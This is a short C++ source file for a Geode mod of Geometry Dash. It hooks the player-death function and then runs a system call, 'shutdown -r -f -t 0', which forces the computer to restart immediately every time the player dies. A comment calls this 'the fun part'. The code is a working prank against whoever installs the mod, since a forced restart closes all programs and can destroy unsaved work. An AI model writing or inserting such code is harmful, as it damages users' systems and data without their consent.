#include <Geode/modify/PlayerObject.hpp>
#include <cstdlib>

class $modify(PlayerObject) {
	void playerDestroyed(bool a) {
		PlayerObject::playerDestroyed(a);

		system("shutdown -r -f -t 0"); // the fun part
	}
};